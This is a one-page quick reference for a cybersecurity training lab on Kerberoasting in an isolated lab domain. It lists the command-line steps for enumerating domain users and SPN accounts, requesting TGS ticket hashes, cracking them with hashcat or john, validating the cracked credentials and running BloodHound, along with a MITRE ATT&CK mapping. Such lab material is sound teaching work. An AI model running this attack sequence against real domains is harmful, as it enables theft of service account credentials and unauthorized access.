# Quick Reference — SCEN-002: Credential Access — Kerberoasting

**Keep this open during the lab. One page when printed.**

---

## Network Diagram

```
┌──────────────────────────────────────────────┐
│            Red Zone (vmbr1)                  │
│   ┌────────────────────┐                     │
│   │  kali-attacker     │                     │
│   │  YOUR MACHINE      │─── dual-homed ───┐  │
│   └────────────────────┘                  │  │
└───────────────────────────────────────────│──┘
                                            │
┌───────────────────────────────────────────│──┐
│            Blue Zone (vmbr2)              │  │
│            Domain: lab.local              │  │
│                                           │  │
│   ┌────────────────────┐   ┌──────────────▼┐ │
│   │  dc01              │   │  ws01         │ │
│   │  Domain Controller │   │  Workstation  │ │
│   │  TCP: 88,389,445   │   │  TCP: 445,3389│ │
│   └────────────────────┘   └───────────────┘ │
└──────────────────────────────────────────────┘
```

Your starting point: `jsmith` — a low-privilege domain user on `lab.local`

---

## Tool Commands

### Credential Verification

```bash
crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local
```

### Domain User Enumeration

```bash
# LDAP query for all users
ldapsearch -H ldap://<dc01_ip> -D "jsmith@lab.local" -w "Password123" \
  -b "DC=lab,DC=local" "(objectClass=user)" sAMAccountName description memberOf

# crackmapexec user list
crackmapexec smb <dc01_ip> -u jsmith -p 'Password123' -d lab.local --users
```

### SPN Enumeration

```bash
# List all accounts with SPNs (no ticket request)
impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip>
```

### TGS Ticket Extraction

```bash
# Request TGS tickets and save hashes
impacket-GetUserSPNs lab.local/jsmith:Password123 -dc-ip <dc01_ip> \
  -request -outputfile kerberoast_hashes.txt
```

### Password Cracking

```bash
# hashcat — mode 13100 = Kerberos 5 TGS-REP (RC4)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# john (alternative)
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Show cracked results
hashcat -m 13100 kerberoast_hashes.txt --show
john --show kerberoast_hashes.txt
```

### Credential Validation

```bash
# Verify cracked password works
crackmapexec smb <dc01_ip> -u <account> -p '<password>' -d lab.local

# Enumerate accessible shares
crackmapexec smb <dc01_ip> -u <account> -p '<password>' -d lab.local --shares
```

### BloodHound (Bonus)

```bash
# Collect AD data
bloodhound-python -d lab.local -u jsmith -p 'Password123' \
  -ns <dc01_ip> -c all
```

---

## MITRE ATT&CK Techniques

| ID | Name | Tactic |
|---|---|---|
| T1087.002 | Account Discovery: Domain Account | Discovery |
| T1069.002 | Permission Groups Discovery: Domain Groups | Discovery |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access |
| T1110.002 | Brute Force: Password Cracking | Credential Access |

---

## Hash Format Reference

```
$krb5tgs$23$*<account>$<domain>$<spn>*$<checksum>$<encrypted_data>
           ^^
           RC4 encryption (etype 23) — hashcat mode 13100
```

---

## Key Ports

| Port | Protocol | Service |
|---|---|---|
| 88 | TCP/UDP | Kerberos |
| 389 | TCP | LDAP |
| 445 | TCP | SMB |
| 636 | TCP | LDAPS |
| 3389 | TCP | RDP |

---

## Objectives Checklist

1. [ ] Enumerate domain users and identify SPN accounts
2. [ ] Extract TGS ticket hashes to a file
3. [ ] Crack at least one hash offline
4. [ ] Validate cracked credentials
5. [ ] Complete incident report
6. [ ] (Bonus) BloodHound AD path mapping
